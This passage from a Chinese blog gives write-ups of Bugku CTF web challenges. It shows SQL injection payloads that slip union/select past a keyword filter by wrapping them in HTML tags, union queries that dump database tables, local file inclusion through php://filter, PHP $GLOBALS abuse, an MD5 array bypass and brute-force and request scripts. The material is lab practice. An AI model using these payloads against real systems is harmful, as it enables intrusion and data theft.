php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤sql</span></span><br><span class="line">$array = <span class="keyword">array</span>(<span class="string">'table'</span>,<span class="string">'union'</span>,<span class="string">'and'</span>,<span class="string">'or'</span>,<span class="string">'load_file'</span>,<span class="string">'create'</span>,<span class="string">'delete'</span>,<span class="string">'select'</span>,<span class="string">'update'</span>,<span class="string">'sleep'</span>,<span class="string">'alter'</span>,<span class="string">'drop'</span>,<span class="string">'truncate'</span>,<span class="string">'from'</span>,<span class="string">'max'</span>,<span class="string">'min'</span>,<span class="string">'order'</span>,<span class="string">'limit'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (substr_count($id, $value) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'包含敏感关键字！'</span>.$value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//xss过滤</span></span><br><span class="line">$id = strip_tags($id);</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1"</span>;</span><br></pre></td></tr></table></figure><p>分析一下过滤代码，一看过滤了union，select，这还怎么玩，看下去发现有个strip_tags($id)，去查了查这个函数</p><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。 </p><p><a href="http://www.w3school.com.cn/php/func_string_strip_tags.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_strip_tags.asp</a></p><p><a href="http://php.net/strip_tags" target="_blank" rel="noopener">http://php.net/strip_tags</a></p><p>可以玩了，可以在敏感关键字中加入HTML标记，绕过关键字过滤，然后再经过strip_tags()函数还原为select等待</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sele&lt;a&gt;ct    selec&lt;p&gt;t</span><br></pre></td></tr></table></figure><p>strip_tags()之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select</span><br></pre></td></tr></table></figure><p>也可以用%00</p><p>获得数据库 sql3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 uni&lt;a&gt;on selec&lt;a&gt;t 1,database() %23</span><br></pre></td></tr></table></figure><p>获得表 hash,key,temp </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 unio&lt;a&gt;n sele&lt;a&gt;ct 1,gr&lt;a&gt;oup_concat(tabl&lt;a&gt;e_name) fro&lt;a&gt;m info&lt;a&gt;rmation_schema.tab&lt;a&gt;les where tab&lt;a&gt;le_schema =database() %23</span><br></pre></td></tr></table></figure><p>获得hash    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 unio&lt;a&gt;n sele&lt;a&gt;ct 1,gr&lt;a&gt;oup_concat(hash) fro&lt;a&gt;m sql3.key %23</span><br></pre></td></tr></table></figure><blockquote><p>KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef}</p></blockquote><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><blockquote><p>地址：<a href="http://120.24.86.145:8002/web12/" target="_blank" rel="noopener">http://120.24.86.145:8002/web12/</a></p><p>作者：@berTrAM</p></blockquote><p>bp抓几次包，repeat几次就拿到了</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527003672930.png" alt="1527003672930"></p><blockquote><p>flag{dummy_game_1s_s0_popular}</p></blockquote><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><blockquote><p>地址：<a href="http://120.24.86.145:8003/" target="_blank" rel="noopener">http://120.24.86.145:8003/</a></p></blockquote><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><blockquote><p><a href="http://120.24.86.145:8004/index1.php" target="_blank" rel="noopener">http://120.24.86.145:8004/index1.php</a> </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! <span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中preg_match正则表达式的 意思是，匹配字符串，\w表示字符+数字+下划线，*代表有若干个\w字符组成。如果不匹配会输出 ‘’args error!‘’\</p><p><a href="http://tool.oschina.net/uploads/apidocs/jquery/regexp.html" target="_blank" rel="noopener">正则表达式手册</a></p><p>而下一句的$$args,比较有意思。解析一下，PHP中变量可以当作另一个变量的变量名。<br>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">'b'</span>;</span><br><span class="line">$b=<span class="string">"Boogle"</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);  <span class="comment">//输出   Boogle</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再看第一句提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! </span><br><span class="line">//flag 在变量中。</span><br></pre></td></tr></table></figure><p>那么结合两者，可以想到一个很有意思的变量－－－－$GLOBALS：一个包含了全部变量的全局组合数组。</p><p>构造payloaｄ：<code>?args=BLOBLAS</code></p><p>即可爆出所有变量，其中包含flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(7) &#123; [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_GET&quot;]=&gt; array(1) &#123; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;ZFkwe3&quot;]=&gt; string(38) &quot;flag&#123;92853051ab894a64f7865cf3c2128b34&#125;&quot; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{92853051ab894a64f7865cf3c2128b34} </p></blockquote><p> <a href="https://blog.csdn.net/l3oog1e/article/details/72772633?utm_source=itdadao&amp;utm_medium=referral" target="_blank" rel="noopener">bugku ctf平台之变量1 write up</a> </p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><blockquote><p>JSPFUCK??????答案格式CTF{<strong><em>\</em></strong>}</p><p><a href="http://120.24.86.145:8002/web5/" target="_blank" rel="noopener">http://120.24.86.145:8002/web5/</a></p><p>字母大写</p></blockquote><p>查看一下源代码，发现JSFUCK，直接F12在控制台运行一下就出来了</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527005094676.png" alt="1527005094676"></p><blockquote><p>CTF{whatfk}</p></blockquote><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><blockquote><p><a href="http://120.24.86.145:9009/hd.php" target="_blank" rel="noopener">http://120.24.86.145:9009/hd.php</a> </p></blockquote><p>发现啥都没有，那就抓个包看看吧</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527005481392.png" alt="1527005481392"></p><blockquote><p>flag{Bugku_k8_23s_istra}</p></blockquote><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><blockquote><p><a href="http://120.24.86.145:8005/post/" target="_blank" rel="noopener">http://120.24.86.145:8005/post/</a> </p></blockquote><p>点进去看见有file=show.php，本地文件包含</p><p>payload:</p><blockquote><p><a href="http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a></p></blockquote><p>读取得</p><blockquote><p>PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><p>flag:flag{edulcni_elif_lacol_si_siht}</p></blockquote><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><blockquote><p>看看源代码吧</p><p><a href="http://120.24.86.145:8002/web4/" target="_blank" rel="noopener">http://120.24.86.145:8002/web4/</a></p></blockquote><p><a href="http://www.w3school.com.cn/jsref/jsref_unescape.asp" target="_blank" rel="noopener">JavaScript unescape() 函数</a></p><p>该函数的工作原理是这样的：通过找到形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字），用 Unicode 字符 \u00xx 和 \uxxxx 替换这样的字符序列进行解码。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62%35%34%61%61%32%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b</span><br></pre></td></tr></table></figure><p>url解码一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">"password"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"undefined"</span> != <span class="keyword">typeof</span> a) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span> == a.value) <span class="keyword">return</span> !<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        alert(<span class="string">"Error"</span>);</span><br><span class="line"></span><br><span class="line">        a.focus();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"levelQuest"</span>).onsubmit = checkSubmit;</span><br></pre></td></tr></table></figure><blockquote><p>KEY{J22JK-HS11} </p></blockquote><h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><blockquote><p><a href="http://120.24.86.145:8002/baopo/" target="_blank" rel="noopener">http://120.24.86.145:8002/baopo/</a></p><p>作者：Se7en</p></blockquote><p>提示说是五位数密码，那就用bp爆破一下吧</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527053661254.png" alt="1527053661254"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527053675368.png" alt="1527053675368"></p><p>设置好之后点start attack</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527053711626.png" alt="1527053711626"></p><p>在pwd=13579的时候返回flag</p><blockquote><p>flag{bugku-baopo-hah}</p></blockquote><h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><blockquote><p><a href="http://120.24.86.145:9001/test/" target="_blank" rel="noopener">http://120.24.86.145:9001/test/</a> </p><p>hints:JavaScript </p></blockquote><p>查看源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> clicks=<span class="number">0</span></span><br><span class="line"> $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   $(<span class="string">"#cookie"</span>)</span><br><span class="line">     .mousedown(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       $(<span class="keyword">this</span>).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">     &#125;)</span><br><span class="line">     .mouseup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       $(<span class="keyword">this</span>).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">       clicks++;</span><br><span class="line">       $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">       <span class="keyword">if</span>(clicks &gt;= <span class="number">1000000</span>)&#123;</span><br><span class="line">       <span class="keyword">var</span> form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><p>当clicks&gt;1000000时，post  clicks参数过去</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527056312520.png" alt="1527056312520"></p><blockquote><p>flag{Not_C00kI3Cl1ck3r} </p></blockquote><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><blockquote><p><a href="http://120.24.86.145:8002/web16/" target="_blank" rel="noopener">http://120.24.86.145:8002/web16/</a></p><p> 听说备份是个好习惯 </p></blockquote><p>尝试一波备份的文件名，尝试index.php.bak的时候成功了，下载下来拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这代码看起来很熟悉的样子，不就是校赛的md5么</p><p>payload</p><blockquote><p><a href="http://120.24.86.145:8002/web16/index.php?kekeyy1[]=1&amp;kekeyy2[]=0" target="_blank" rel="noopener">http://120.24.86.145:8002/web16/index.php?kekeyy1[]=1&amp;kekeyy2[]=0</a></p></blockquote><blockquote><p>Bugku{OH_YOU_FIND_MY_MOMY} </p></blockquote><h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><blockquote><p>快来查查成绩吧 </p><p><a href="http://120.24.86.145:8002/chengjidan/" target="_blank" rel="noopener">http://120.24.86.145:8002/chengjidan/</a> </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; order by 4 %23</span><br><span class="line"></span><br><span class="line">id=-1&apos; union select 1,database(),user(),4 %23</span><br><span class="line"></span><br><span class="line">id=-1&apos; union select 1,group_concat(table_name) ,user(),4  from information_schema.tables where table_schema = database()%23</span><br><span class="line"></span><br><span class="line">id=-1&apos; union select 1,group_concat(skctf_flag) ,user(),4  from fl4g %23</span><br></pre></td></tr></table></figure><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><blockquote><p><a href="http://120.24.86.145:8002/qiumingshan/" target="_blank" rel="noopener">http://120.24.86.145:8002/qiumingshan/</a></p><p>是不是老司机试试就知道。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    source = s.get(url)</span><br><span class="line">    expression = re.search(<span class="string">r'(\d+[+\-*])+(\d+)'</span>, source.text).group()</span><br><span class="line">    <span class="comment"># print(expression)</span></span><br><span class="line">    result = eval(expression)</span><br><span class="line">    data = &#123;<span class="string">'value'</span>: result&#125;</span><br><span class="line">    print(s.post(url,data=data).text)</span><br></pre></td></tr></table></figure><p><a href="http://www.bugku.com/thread-1057-1-1.html" target="_blank" rel="noopener">http://www.bugku.com/thread-1057-1-1.html</a></p><p><a href="https://blog.csdn.net/EustiaSora/article/details/79142835" target="_blank" rel="noopener">https://blog.csdn.net/EustiaSora/article/details/79142835</a></p><p><a href="https://blog.csdn.net/hawkerou/article/details/53518154" target="_blank" rel="noopener">python字符串切割：str.split()和re.split()对比</a> </p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><blockquote><p>速度要快！！！！！！</p><p><a href="http://120.24.86.145:8002/web6/" target="_blank" rel="noopener">http://120.24.86.145:8002/web6/</a></p><p>格式KEY{xxxxxxxxxxxxxx}</p></blockquote><h4 id=""><a href="#" class="headerlink" title=" "></a> </h4><p>抓包发现返回报头有flag字段</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527092023569.png" alt="1527092023569"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/24 0:02</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : bugku-web6.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">r = session.get(url)</span><br><span class="line">get = str(r.headers[<span class="string">'flag'</span>])</span><br><span class="line">print(get)</span><br><span class="line">flag = base64.b64decode(str(r.headers[<span class="string">'flag'</span>]))</span><br><span class="line">flag = base64.b64decode(str(flag).split(<span class="string">':'</span>)[<span class="number">1</span>][<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line"><span class="comment"># print(str(flag).split(':')[1][1:-1])</span></span><br><span class="line">print(str(flag)[<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'margin'</span>: str(flag)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line">r = session.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h3 id="详解-CTF-Web-中的快速反弹-POST-请求"><a href="#详解-CTF-Web-中的快速反弹-POST-请求" class="headerlink" title="详解 CTF Web 中的快速反弹 POST 请求"></a><a href="https://ciphersaw.me/2017/12/16/%E8%AF%A6%E8%A7%A3%20CTF%20Web%20%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%BC%B9%20POST%20%E8%AF%B7%E6%B1%82/" target="_blank" rel="noopener">详解 CTF Web 中的快速反弹 POST 请求</a></h3><h2 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h2><blockquote><p><a href="http://120.24.86.145:8002/web11/" target="_blank" rel="noopener">http://120.24.86.145:8002/web11/</a></p><p>答案格式：KEY{xxxxxxxx}</p></blockquote><p>注意到URL为</p><blockquote><p><a href="http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a></p></blockquote><blockquote><p>a2V5cy50eHQ=</p></blockquote><p>base64解码得</p><blockquote><p>keys.txt</p></blockquote><p>于是<code>index.php</code>base64编码为<code>aW5kZXgucGhw</code></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527093238992.png" alt="1527093238992"></p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/bugku-Web.assets/1527093265272.png" alt="1527093265272"></p><p>于是一句一句的复制出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 